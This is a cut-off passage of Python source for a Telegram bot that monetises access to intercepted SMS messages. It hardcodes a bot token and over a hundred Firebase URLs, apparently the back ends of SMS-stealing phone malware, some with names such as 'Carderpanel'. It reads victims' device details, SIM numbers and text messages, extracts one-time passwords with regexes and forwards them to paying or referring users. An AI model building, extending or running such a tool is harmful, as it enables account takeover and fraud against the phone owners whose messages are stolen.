#!/usr/bin/env python3
"""
════════════════════════════════════════════════════════════
        OTP PANEL BOT — SUPREME PREMIUM EDITION v7.0
   Clean UI | Anti-Glitch | Bulk Auto-Add | Render 24/7
════════════════════════════════════════════════════════════
"""

import os
import re
import time
import json
import asyncio
import logging
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime
from typing import Optional
from dataclasses import dataclass

import aiohttp
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton, BotCommand,
)
from telegram.error import BadRequest
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)

# ════════════════════════════════════════════════════════════
#  LOGGING & SETUP
# ════════════════════════════════════════════════════════════
logging.basicConfig(
    format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    level=logging.WARNING,
)

def tlog(msg: str) -> None:
    print(f"[{datetime.now().strftime('%I:%M:%S %p')}] {msg}", flush=True)

# ════════════════════════════════════════════════════════════
#  RENDER KEEP-ALIVE SERVER (DUMMY SERVER)
# ════════════════════════════════════════════════════════════
class Dummy(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Bot is Running 24/7 on Render!")

def keep_alive():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), Dummy)
    threading.Thread(target=server.serve_forever, daemon=True).start()

# ════════════════════════════════════════════════════════════
#  CONFIG & DATABASES
# ════════════════════════════════════════════════════════════
TOKEN         = "8437134912:AAFPxS63ZgoNF3XH-69EDn0nhBqys-1iAtE"
BOT_USERNAME  = "onlinenonlyscript_bot"
DB_FILE       = "bot_database.json"
ADMIN_IDS: set[int] = {7178096331}
POLL_INTERVAL = 5
SMS_LIMIT     = 15

REQUIRED_CHANNELS = [
    {"username": "earnflowspidy", "url": "https://t.me/earnflowspidy", "name": "Raji Expilot"},
]

DATABASES = {
    "Update": "https://update-cf7a9-default-rtdb.firebaseio.com",
    "Vvvvv": "https://vvvvv-b5eae-default-rtdb.firebaseio.com",
    "Anudg": "https://anudg-21c1c-default-rtdb.firebaseio.com",
    "Rajkumar": "https://rajkumar-b6cbe-default-rtdb.firebaseio.com",
    "Rettiugh": "https://rettiugh-default-rtdb.firebaseio.com",
    "Deepak": "https://deepak-c22e3-default-rtdb.firebaseio.com",
    "Demonrat": "https://demonrat-aa782-default-rtdb.firebaseio.com",
    "Riyy": "https://riyy-e012e-default-rtdb.firebaseio.com",
    "Angeladmin": "https://angeladmin-9dedc-default-rtdb.firebaseio.com",
    "Sexypayload": "https://sexypayload-default-rtdb.firebaseio.com",
    "Crahul": "https://crahul-abcb4-default-rtdb.firebaseio.com",
    "Yellowpanel": "https://yellowpanel-9f036-default-rtdb.firebaseio.com",
    "Shivampanel": "https://shivampanel-eb3b7-default-rtdb.firebaseio.com",
    "Drahul": "https://drahul-3bd1b-default-rtdb.firebaseio.com",
    "Haab": "https://haab-b3370-default-rtdb.firebaseio.com",
    "Navin": "https://navin-9fb56-default-rtdb.firebaseio.com",
    "Deepk_Hh": "https://deepk-hh-default-rtdb.firebaseio.com",
    "Kalih": "https://kalih-f389d-default-rtdb.firebaseio.com",
    "Jinbhai": "https://jinbhai-add9a-default-rtdb.firebaseio.com",
    "Jeko": "https://jeko-c11ef-default-rtdb.firebaseio.com",
    "Rich_People": "https://rich-people-19e06-default-rtdb.firebaseio.com",
    "Jannu": "https://jannu-c03ea-default-rtdb.firebaseio.com",
    "Rmx3511uuj": "https://rmx3511uuj-default-rtdb.firebaseio.com",
    "Imdum": "https://imdum-6e873-default-rtdb.firebaseio.com",
    "Miyakhalifa": "https://miyakhalifa-143d5-default-rtdb.firebaseio.com",
    "Ayan": "https://ayan-5581d-default-rtdb.firebaseio.com",
    "Dharmesh": "https://dharmesh-panel-default-rtdb.firebaseio.com",
    "Fogda": "https://fogda-f8255-default-rtdb.firebaseio.com",
    "Shadow": "https://shadow-f9cd3-default-rtdb.firebaseio.com",
    "E13Turnament": "https://e13turnament-1-default-rtdb.firebaseio.com",
    "Vampirebhsuhan": "https://vampirebhsuhan-default-rtdb.firebaseio.com",
    "Pri14": "https://pri14-b45dd-default-rtdb.firebaseio.com",
    "Human_34": "https://human-34-kumar-default-rtdb.firebaseio.com",
    "Rahais": "https://rahais-default-rtdb.firebaseio.com",
    "Tinmm88": "https://tinmm88-b7db5-default-rtdb.firebaseio.com",
    "E9Turnament": "https://e9turnament1-default-rtdb.firebaseio.com",
    "Raaz": "https://raaz-5287d-default-rtdb.firebaseio.com",
    "Apkpure": "https://apkpure-6eb6a-default-rtdb.firebaseio.com",
    "E14Turnament": "https://e14turnament2-default-rtdb.firebaseio.com",
    "Bossuun": "https://bossuun-default-rtdb.firebaseio.com",
    "Jsjsjdj": "https://jsjsjdj-7f0d1-default-rtdb.firebaseio.com",
    "Rahul": "https://rahul-54fe9-default-rtdb.firebaseio.com",
    "Runjun": "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "Gsjjshdbs": "https://gsjjshdbs-default-rtdb.firebaseio.com",
    "Fir_1fa16": "https://fir-1fa16-default-rtdb.firebaseio.com",
    "Newspreding": "https://newspreding-default-rtdb.firebaseio.com",
    "Privatesok": "https://privatesok-59944-default-rtdb.firebaseio.com",
    "Risho": "https://risho-d4c66-default-rtdb.firebaseio.com",
    "Fir_27c9e": "https://fir-27c9e-default-rtdb.firebaseio.com",
    "Singhaana_6f": "https://singhaana-6f199-default-rtdb.firebaseio.com",
    "Dogla": "https://dogla-de225-default-rtdb.firebaseio.com",
    "Vibe": "https://vibe-d238e-default-rtdb.firebaseio.com",
    "Painislv": "https://painislv-default-rtdb.firebaseio.com",
    "Jsjdj7374j": "https://jsjdj7374j-default-rtdb.firebaseio.com",
    "Jaduopop": "https://jaduopop-a9a12-default-rtdb.firebaseio.com",
    "Anjali": "https://anjali-4a4bc-default-rtdb.firebaseio.com",
    "Devil_King": "https://devil-king-101d4-default-rtdb.firebaseio.com",
    "Shuruwat": "https://shuruwat-admin-default-rtdb.firebaseio.com",
    "Rajputlodu": "https://rajputlodu-5bed0-default-rtdb.firebaseio.com",
    "Kitter": "https://kitter-34345-default-rtdb.firebaseio.com",
    "Abcd_6757": "https://abcd-6757-ad421-default-rtdb.firebaseio.com",
    "Kali": "https://kali-90e1e-default-rtdb.firebaseio.com",
    "Asif_Alam": "https://asif-alam991-default-rtdb.firebaseio.com",
    "Anvith": "https://anvith-jaan-default-rtdb.firebaseio.com",
    "Chutkabaal": "https://chutkabaal-d7051-default-rtdb.firebaseio.com",
    "Clone": "https://clone-79a6f-default-rtdb.firebaseio.com",
    "Hospital_14": "https://hospital-14-default-rtdb.firebaseio.com",
    "Gooodhua": "https://gooodhua-default-rtdb.firebaseio.com",
    "Yqhwy": "https://yqhwy-2fb47-default-rtdb.firebaseio.com",
    "Khushi": "https://khushi-7fb1f-default-rtdb.firebaseio.com",
    "Ppaanaal": "https://ppaanaal-default-rtdb.firebaseio.com",
    "Priyanshrandi": "https://priyanshrandi-18600-default-rtdb.firebaseio.com",
    "Pehle_Panel": "https://pehle-panel-default-rtdb.firebaseio.com",
    "Yogeshbhai": "https://yogeshbhai-default-rtdb.firebaseio.com",
    "Singhaana": "https://singhaana-default-rtdb.firebaseio.com",
    "Myapp": "https://myapp-8228a-default-rtdb.firebaseio.com",
    "App_2": "https://app-2-7ac78-default-rtdb.firebaseio.com",
    "Sorry": "https://sorry-2d3c5-default-rtdb.firebaseio.com",
    "Fvbtl": "https://fvbtl-3f47c-default-rtdb.firebaseio.com",
    "Anther": "https://anther-a3fe9-default-rtdb.firebaseio.com",
    "Avraj": "https://avraj-4d02e-default-rtdb.firebaseio.com",
    "Spy_25": "https://spy-25-default-rtdb.firebaseio.com",
    "Sirelech1": "https://sirelech1-default-rtdb.firebaseio.com",
    "Rahulcscperosnl": "https://rahulcscperosnl-default-rtdb.firebaseio.com",
    "Reliable": "https://reliable-stroopwa-default-rtdb.firebaseio.com",
    "Rancho": "https://rancho-72506-default-rtdb.firebaseio.com",
    "Pablo": "https://pablo-5a0d2-default-rtdb.firebaseio.com",
    "Reen": "https://reen-f8f5f-default-rtdb.firebaseio.com",
    "Pehla_Green": "https://pehla-panel-green-default-rtdb.firebaseio.com",
    "Lodaroll": "https://lodaroll-default-rtdb.firebaseio.com",
    "Strange": "https://strange-2e4aa-default-rtdb.firebaseio.com",
    "Carderpanel": "https://carderpanel-default-rtdb.firebaseio.com",
    "Jchchc": "https://jchchc-5f16d-default-rtdb.firebaseio.com",
    "Jpicku": "https://jpicku-47790-default-rtdb.firebaseio.com",
    "Jeet": "https://jeet-op-default-rtdb.firebaseio.com",
    "Zeni": "https://zeni-ae60b-default-rtdb.firebaseio.com",
    "Simadevi": "https://simadevi-f42fc-default-rtdb.firebaseio.com",
    "Admin_Cliwny": "https://admin-cliwny-default-rtdb.firebaseio.com",
    "Yellow_Pannel": "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com",
    "Tracegod": "https://tracegod-168d5-default-rtdb.firebaseio.com",
    "Rto_02": "https://rto-02-april06-default-rtdb.firebaseio.com",
    "Pint": "https://pint-f465b-default-rtdb.firebaseio.com",
    "Tuuui": "https://tuuui-60b15-default-rtdb.firebaseio.com",
    "Uc_Op": "https://uc-op-ca3d2-default-rtdb.firebaseio.com",
    "Rolex": "https://rolex-carder-default-rtdb.firebaseio.com",
    "BusinessApps": "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
    "Admin_Sonu": "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
    "Comkingdir": "https://comkingdir-default-rtdb.firebaseio.com",
    "Suman": "https://suman-penal-default-rtdb.firebaseio.com",
    "Bulbul": "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
    "Harrwp": "https://harrwp-6be36-default-rtdb.firebaseio.com",
    "Jkhsadfhjk": "https://jkhsadfhjk-default-rtdb.firebaseio.com",
    "Iiiii": "https://iiiii-ade0e-default-rtdb.firebaseio.com",
    "Download": "https://download-b7393-default-rtdb.firebaseio.com",
    "Jonisins": "https://jonisins-52271-default-rtdb.firebaseio.com",
    "No_Admin": "https://no-admin-e0a30-default-rtdb.firebaseio.com",
    "Admin_Panel": "https://admin-panel-bfcdc-default-rtdb.firebaseio.com",
    "Ueuwuw": "https://ueuwuw-default-rtdb.firebaseio.com",
    "Priysnshuu": "https://priysnshuu-default-rtdb.firebaseio.com",
    "Hloo": "https://hloo-acc63-default-rtdb.firebaseio.com",
    "Ajay": "https://ajay-33c1b-default-rtdb.firebaseio.com",
    "Krijhjuiiiccyy": "https://krijhjuiiiccyy-default-rtdb.firebaseio.com",
    "Hamza": "https://hamza-5a3c2-default-rtdb.firebaseio.com",
    "Xxx_Kumar": "https://xxx-kumar-default-rtdb.firebaseio.com",
    "Arvind": "https://arvind-c5b03-default-rtdb.firebaseio.com",
    "Rajakk": "https://rajakk-80ecd-default-rtdb.firebaseio.com",
    "Panel_Wala": "https://panel-wala-v16-default-rtdb.firebaseio.com",
    "Admin_Khanashif": "https://admin-panel-khanashif-default-rtdb.firebaseio.com",
    "Gggggg": "https://gggggg-979bd-default-rtdb.firebaseio.com",
    "Panel123628": "https://panel123628-default-rtdb.firebaseio.com",
    "Bandhan2": "https://bandhan2-7jan-default-rtdb.firebaseio.com",
}

# ════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ════════════════════════════════════════════════════════════
seen_ids: set[str] = set()
first_run: bool = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None

all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}
chats_registry: dict[str, set[int]] = {TOKEN: set()}

CLONES: dict[str, dict] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}
EXTRA_DBS: dict[str, str] = {}  # Keeps dynamically bulk-added DBs safe!

# --- GLITCH PROTECTION SYSTEM ---
user_processing: set[int] = set()

def check_and_lock_user(uid: int) -> bool:
    """Anti-Glitch System: Prevents processing overlapping requests."""
    if uid in user_processing: return False
    now = time.time()
    if now - user_cooldowns.get(uid, 0) < 1.0: return False
    user_cooldowns[uid] = now
    user_processing.add(uid)
    return True

def unlock_user(uid: int):
    user_processing.discard(uid)

PAGE_SIZE = 20

# ════════════════════════════════════════════════════════════
#  MODELS & UTILS
# ════════════════════════════════════════════════════════════
@dataclass
class Device:
    id: str
    name: str
    status: str
    battery: int
    timestamp: int
    numbers: list
    device_info: str
    sms_path: str
    base_url: str
    db_tag: str

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

def extract_valid_numbers(*raw_nums) -> list:
    nums = []
    for n in raw_nums:
        if n and len(re.sub(r"\D", "", str(n))) > 4:
            nums.append(fmt_num(n))
    return list(set(nums))

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return datetime.now().strftime("%d %b %Y %I:%M %p")

def parse_status_str(val) -> str:
    if not val: return "offline"
    if isinstance(val, bool): return "online" if val else "offline"
    return "online" if str(val).lower() == "online" else "offline"

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        d = re.sub(r"\D", "", val)
        return int(d) if d else 0
    return 0

# ════════════════════════════════════════════════════════════
#  PERSISTENCE
# ════════════════════════════════════════════════════════════
def _sync_save_data():
    try:
        clones_to_save = {}
        for t, d in CLONES.items():
            clones_to_save[t] = {
                "creator": d.get("creator"), "expiry": d.get("expiry"),
                "custom_db": d.get("custom_db"), "users": d.get("users", {}),
                "username": d.get("username", ""),
            }
        with open(DB_FILE, "w") as f:
            json.dump({"all_users": all_users, "CLONES": clones_to_save, "EXTRA_DBS": EXTRA_DBS}, f, indent=4)
    except Exception as e:
        tlog(f"Save Data Error: {e}")

async def save_data_async():
    await asyncio.to_thread(_sync_save_data)

def load_data():
    global all_users, CLONES, EXTRA_DBS
    if not os.path.exists(DB_FILE): return
    try:
        with open(DB_FILE, "r") as f:
            data = json.load(f)
        for k, v in data.get("all_users", {}).items():
            all_users[int(k)] = v
        for t, d in data.get("CLONES", {}).items():
            restored_users = {int(uk): uv for uk, uv in d.get("users", {}).items()}
            d["users"] = restored_users
            CLONES[t] = d
        
        extra = data.get("EXTRA_DBS", {})
        for k, v in extra.items():
            EXTRA_DBS[k] = v
            DATABASES[k] = v
    except Exception as e:
        tlog(f"Load Data Error: {e}")

async def auto_save_loop():
    while True:
        await asyncio.sleep(60)
        await save_data_async()

async def cleanup_cooldowns():
    while True:
        await asyncio.sleep(300)
        now = time.time()
        for k in list(user_cooldowns.keys()):
            if now - user_cooldowns[k] > 10:
                del user_cooldowns[k]

def is_vip(bot_token: str, user_id: int) -> bool:
    if bot_token == TOKEN and user_id in ADMIN_IDS: return True
    if bot_token != TOKEN and user_id == CLONES.get(bot_token, {}).get("creator"): return True
    users_db = all_users if bot_token == TOKEN else CLONES.get(bot_token, {}).get("users", {})
    return time.time() < users_db.get(user_id, {}).get("vip_until", 0.0)

def get_vip_time_left(bot_token: str, user_id: int) -> str:
    users_db = all_users if bot_token == TOKEN else CLONES.get(bot_token, {}).get("users", {})
    left = users_db.get(user_id, {}).get("vip_until", 0.0) - time.time()
    if left <= 0: return "Not VIP"
    h, m = int(left // 3600), int((left % 3600) // 60)
    return f"{h}h {m}m"

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    tlog(f"Telegram API Error: {context.error}")

# ════════════════════════════════════════════════════════════
#  HTTP SESSION & FIREBASE FETCHERS
# ════════════════════════════════════════════════════════════
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=1000, keepalive_timeout=30)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception: return None

async def fb_keys(path: str, base: str) -> list[str]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status != 200: return []
            data = await r.json(content_type=None)
            return list(data.keys()) if isinstance(data, dict) else []
    except Exception: return []

def _create_device(dev_id, tag, url, data_dict, source_type, extra_info=None):
    if source_type == 'sim_details':
        info = extra_info or {}
        nums = extract_valid_numbers(data_dict.get("sim1Number"), data_dict.get("sim2Number"))
        model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
        return Device(
            id=dev_id, name=model, status=parse_status_str(info.get("Status")),
            battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or 0),
            numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}",
            sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag)
            
    elif source_type == 'user_data':
        nums = extract_valid_numbers(data_dict.get("numberSim1"), data_dict.get("numberSim2"), data_dict.get("mobNo"))
        model = data_dict.get("d_name") or f"Device-{dev_id[:6]}"
        return Device(
            id=dev_id, name=model, status=parse_status_str(data_dict.get("status")),
            battery=parse_battery(data_dict.get("battery")), timestamp=int(data_dict.get("timestamp") or 0),
            numbers=nums, device_info=data_dict.get("Device_info") or f"Device ID: {dev_id}",
            sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag)
            
    elif source_type == 'clients':
        sim_num = ""
        if data_dict.get("sims") and isinstance(data_dict["sims"], list) and len(data_dict["sims"]) > 0:
            sim_num = (data_dict["sims"][0] or {}).get("phoneNumber", "")
        nums = extract_valid_numbers(data_dict.get("mobNo"), sim_num)
        if not nums and not data_dict.get("modelName"): return None
        model = data_dict.get("modelName") or f"Device-{dev_id[:6]}"
        return Device(
            id=dev_id, name=model, status=parse_status_str(data_dict.get("status")),
            battery=parse_battery(data_dict.get("battery")), timestamp=0, numbers=nums,
            device_info=f"Model: {model}\nProvider: {data_dict.get('service_provider','')}",
            sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag)

async def fetch_db_data(tag: str, url: str) -> list[Device]:
    devices_list = []
    added_set = set()
    try:
        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url), fb_get("clients", url)
        )

        if isinstance(sim_all, dict):
            info_all = device_info_all or {}
            for dev_id, sim in sim_all.items():
                if dev_id in added_set: continue
                added_set.add(dev_id)
                dev = _create_device(dev_id, tag, url, sim, 'sim_details', info_all.get(dev_id, {}))
                if dev: devices_list.append(dev)

        if isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if dev_id in added_set or not isinstance(data, dict): continue
                added_set.add(dev_id)
                dev = _create_device(dev_id, tag, url, data, 'user_data')
                if dev: devices_list.append(dev)

        if isinstance(clients_all, dict):
            for dev_id, client in clients_all.items():
                if dev_id in added_set or not isinstance(client, dict): continue
                dev = _create_device(dev_id, tag, url, client, 'clients')
                if dev: 
                    added_set.add(dev_id)
                    devices_list.append(dev)

        if root_keys:
            type4_keys = [k for k in root_keys if len(k) == 16 and re.match(r"^[0-9a-fA-F]+$", k)]
            if type4_keys:
                async def fetch_t4(k):
                    return k, await asyncio.gather(fb_get(f"{k}/deviceInfo", url), fb_get(f"{k}/simInfo", url), fb_get(f"{k}/heartbeat", url))
                results = await asyncio.gather(*(fetch_t4(k) for k in type4_keys))
                for k, (info, sim, hb) in results:
                    if not isinstance(info, dict) or k in added_set: continue
                    added_set.add(k)
                    nums = []
                    if isinstance(sim, dict):
                        for _, sim_v in sim.items():
                            if isinstance(sim_v, dict):
                                n = sim_v.get("number", "")
                                if n and len(re.sub(r"\D", "", n)) > 4:
                                    nums.append(fmt_num(n))
                    model = info.get("model") or info.get("brand") or f"Device-{k[:6]}"
                    ts = int(hb) if isinstance(hb, (int, float)) else 0
                    is_online = (time.time() * 1000 - ts) < 300000 if ts else False
                    status = "online" if is_online else "offline"
                    devices_list.append(Device(
                        id=k, name=model, status=status, battery=0, timestamp=ts, numbers=nums,
                        device_info=f"Model: {model}\nBrand: {info.get('brand','')}\nAndroid: {info.get('version','')}\nDevice ID: {k}",
                        sms_path=f"{k}/receivedSms", base_url=url, db_tag=tag))
    except Exception: pass
    return devices_list

async def get_all_devices(bot_token: str) -> list[Device]:
    dbs_to_check = list(DATABASES.keys())
    if bot_token != TOKEN and bot_token in CLONES:
        if custom_db := CLONES[bot_token].get("custom_db"):
            dbs_to_check.append(f"C_{bot_token[:6]}")
    devices = []
    for tag in dbs_to_check:
        devices.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
    unique_devices = {d.id: d for d in devices}
    dev_list = list(unique_devices.values())
    dev_list.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
    return dev_list

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]

# ════════════════════════════════════════════════════════════
#  PREMIUM UI & MENUS (CLEAN & PROFESSIONAL)
# ════════════════════════════════════════════════════════════
def get_premium_main_menu(is_admin: bool, bot_token: str) -> ReplyKeyboardMarkup:
    keys = [
        [KeyboardButton("📱 Live Devices"), KeyboardButton("🔍 Search Number")]
    ]
    if bot_token == TOKEN:
        keys.append([KeyboardButton("💸 Refer & Earn"), KeyboardButton("🤖 Create Your Bot")])
    if is_admin:
        keys.append([KeyboardButton("🛡 Admin Panel")])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start = page * PAGE_SIZE
    rows = []
    for d in devices[start: start + PAGE_SIZE]:
        tag = f"[{d.db_tag}] "
        icon = "🟢" if d.status == "online" else "🔴"
        lbl = f"{icon} 📱 {tag}{' & '.join(d.numbers)}" if d.numbers else f"{icon} ⚙️ {tag}{d.name[:10]} ({d.id[:6]})"
        rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])

    nav = []
    if page > 0: nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="home"), InlineKeyboardButton("🔍 Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        for d in online:
            tag = f"[{d.db_tag}] "
            lbl = f"🟢 📱 {tag}{' & '.join(d.numbers)}" if d.numbers else f"🟢 ⚙️ {tag}{d.name[:10]} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else:
        rows.append([InlineKeyboardButton("😴 No devices online", callback_data="noop")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="online"), InlineKeyboardButton("📋 All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def get_vip_denied_keyboard(chat_id: int, req_coins: int) -> InlineKeyboardMarkup:
    ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👑 Buy VIP (20 🪙)", callback_data="buy_vip"),
         InlineKeyboardButton("💸 Refer & Earn", url=f"https://t.me/share/url?url={ref_link}&text=Try this premium OTP Panel Bot!")],
        [InlineKeyboardButton(f"🤖 Create Clone Bot ({req_coins} 🪙)", callback_data="create_bot")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ])

async def safe_edit(query, text, reply_markup=None, parse_mode="HTML"):
    try:
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=True)
    except BadRequest as e:
        if "not modified" not in str(e).lower():
            try: await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=None)
            except: pass

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    date = sms_date(sms)
    sim = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    
    if otp:
        sim_line = f"│ 📡 SIM : {sim}\n" if sim else ""
        return (f"✨ <b>NEW OTP RECEIVED</b> ✨\n━━━━━━━━━━━━━━━━━━\n"
                f"│ 🔑 <b>OTP</b> : <code>{otp}</code>\n│ 📱 Number : {num_label}\n"
                f"│ 👤 From : {sender}\n│ 📅 Time : {date}\n{sim_line}"
                f"━━━━━━━━━━━━━━━━━━\n💬 {body}")
    return (f"📩 <b>NEW SMS RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"📱 Number : {num_label}\n👤 From : {sender}\n📅 Time : {date}\n"
            f"━━━━━━━━━━━━━━━━━━\n💬 {body}")

def admin_panel_text(bot_token: str) -> str:
    users_db = all_users if bot_token == TOKEN else CLONES[bot_token]["users"]
    total = len(users_db)
    verified = sum(1 for u in users_db.values() if u.get("verified"))
    unverified = total - verified
    total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
    active_chats = len(chats_registry.get(bot_token, set()))
    text = (f"🛡 ADMIN PANEL\n━━━━━━━━━━━━━━━━━━\n"
            f"👥 Total Users    : {total}\n✅ Verified Users : {verified}\n"
            f"⏳ Unverified     : {unverified}\n📡 Active Chats   : {active_chats}\n"
            f"🏆 Total OTP Views: {total_otps}\n")
    if bot_token == TOKEN:
        text += f"🤖 Cloned Bots    : {len(CLONES)}\n"
    text += f"━━━━━━━━━━━━━━━━━━\n🕐 Updated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
    return text

def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
    keys = [
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
         InlineKeyboardButton("👥 User List", callback_data="admin_users")],
        [InlineKeyboardButton("🎁 Gift Coins to All", callback_data="admin_gift_coins")],
        [InlineKeyboardButton("➕ Add Firebase URL", callback_data="admin_add_firebase")]
    ]
    if bot_token != TOKEN:
        keys.append([InlineKeyboardButton("🔗 Add Custom Firebase URL", callback_data="add_custom_db")])
    keys.append([InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"),
                 InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(keys)

async def check_membership(bot_token, bot, user_id: int) -> list[str]:
    if bot_token != TOKEN: return []
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=f"@{ch['username']}", user_id=user_id)
            if str(member.status).lower() in ("left", "kicked", "banned"): not_joined.append(ch["username"])
        except Exception: pass
    return not_joined

# ════════════════════════════════════════════════════════════
#  TELEGRAM HANDLERS
# ════════════════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    user = update.effective_user
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)
    
    if not check_and_lock_user(chat_id): return
    try:
        if not is_main_bot:
            if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]:
                await update.message.reply_text("🚫 Premium access expired.")
                return
            users_db, is_admin = CLONES[bot_token]["users"], (chat_id == CLONES[bot_token]["creator"])
        else:
            users_db, is_admin = all_users, (chat_id in ADMIN_IDS)

        if users_db.get(chat_id, {}).get("banned"): return

        ref_id = int(ctx.args[0]) if ctx.args and ctx.args[0].isdigit() else None

        if chat_id not in users_db:
            users_db[chat_id] = {
                "name": user.full_name or "Unknown", "username": user.username or "",
                "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
                "verified": False, "referrals": 0, "coins": 0, "vip_until": 0.0,
                "otp_count": 0, "bots_created": 0, "bonus_10_received": False,
                "referred_by": ref_id if ref_id != chat_id else None, "banned": False
            }
            if is_main_bot and ref_id and ref_id in users_db and ref_id != chat_id:
